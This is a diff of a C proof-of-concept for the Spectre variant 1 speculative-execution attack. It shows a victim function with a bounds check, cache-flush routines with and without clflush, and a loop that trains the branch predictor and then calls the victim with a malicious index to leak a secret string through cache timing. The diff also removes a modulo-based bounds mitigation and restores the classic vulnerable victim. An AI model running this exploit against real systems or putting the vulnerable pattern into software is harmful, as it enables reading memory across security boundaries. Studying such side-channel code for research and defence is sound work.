@@ -24,11 +24,9 @@
 /********************************************************************
 Victim code.
 ********************************************************************/
-#define ARRAY1_START 0x1000000
-#define ARRAY2_SIZE (256 * 512)
 unsigned int array1_size = 16;
 uint8_t unused1[64];
-uint8_t array1[33 * 512 + ARRAY1_START] = {
+uint8_t array1[160] = {
   1,
   2,
   3,
@@ -47,21 +45,15 @@ uint8_t array1[33 * 512 + ARRAY1_START] = {
   16
 };
 uint8_t unused2[64];
-uint8_t array2[ARRAY2_SIZE];
+uint8_t array2[256 * 512];
 
 char * secret = "The Magic Words are Squeamish Ossifrage.";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-void victim_function(size_t x, size_t j) {
-  size_t array_size = 0;
-  j = j * 512 + ARRAY1_START;
-  /* array_size value is repeated at different offsets to avoid having to flush it */
-  array_size = array1[j];
-  if (x < array_size) {
-    x = array1[x] * 512;
-    x = x % ARRAY2_SIZE; /* Secure out of bounds */
-    temp &= array2[x];
+void victim_function(size_t x) {
+  if (x < array1_size) {
+    temp &= array2[array1[x] * 512];
   }
 }
 
@@ -75,7 +67,8 @@ Analysis code
 uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
 
 /* Flush memory using long SSE instructions */
-void flush_memory_sse(uint8_t * addr) {
+void flush_memory_sse(uint8_t * addr)
+{
   float * p = (float *)addr;
   float c = 0.f;
   __m128 i = _mm_setr_ps(c, c, c, c);
@@ -85,27 +78,6 @@ void flush_memory_sse(uint8_t * addr) {
   for (k = 0; k < 4; k++)
     for (l = 0; l < 4; l++)
       _mm_stream_ps(&p[(l * 4 + k) * 4], i);
-}
-
-void clflush_sse(size_t iterations) {
-  /* Flush array2[256*(0..255)] from cache
-     using long SSE instruction several times */
-  int i, j;
-  for (j = 0; j < 16; j++)
-    for (i = 0; i < iterations; i++)
-      flush_memory_sse( & array2[i * 512]);
-}
-
-/* Alternative to using clflush to flush the CPU cache */
-/* Read addresses at 4096-byte intervals out of a large array.
-   Do this around 2000 times, or more depending on CPU cache size. */
-void clflush(size_t iterations) {
-  int junk2 = 0;
-  int l;
-  
-  for(l = iterations * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
-    junk2 = cache_flush_array[l];
-  } 
 }
 #endif
 
@@ -117,6 +89,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   register uint64_t time1, time2;
   volatile uint8_t * addr;
 
+#ifdef NOCLFLUSH
+  int junk2 = 0;
+  int l;
+#endif
+
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
@@ -126,7 +103,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 #else
-    clflush_sse(256);
+    /* Flush array2[256*(0..255)] from cache
+       using long SSE instruction several times */
+    for (j = 0; j < 16; j++)
+      for (i = 0; i < 256; i++)
+        flush_memory_sse( & array2[i * 512]);
 #endif
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
@@ -135,7 +116,13 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #ifndef NOCLFLUSH
       _mm_clflush( & array1_size);
 #else
-      clflush(CACHE_FLUSH_ITERATIONS);
+      /* Alternative to using clflush to flush the CPU cache */
+      /* Read addresses at 4096-byte intervals out of a large array.
+         Do this around 2000 times, or more depending on CPU cache size. */
+
+      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
+        junk2 = cache_flush_array[l];
+      } 
 #endif
 
       /* Delay (can also mfence) */
@@ -148,7 +135,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       x = training_x ^ (x & (malicious_x ^ training_x));
 
       /* Call the victim! */
-      victim_function(x, j);
+      victim_function(x);
 
     }
 
@@ -255,11 +242,6 @@ int main(int argc,
   #ifdef NOCLFLUSH
   for (i = 0; i < sizeof(cache_flush_array); i++) {
     cache_flush_array[i] = 1;
-  }
-  
-  /* Set different "size" values at 512 byte offsets each (need to be uncached) */
-  for (i = 0; i < 33; i++) {
-    array1[i * 512 + ARRAY1_START] = 16; // array1_size
   }
   #endif
   
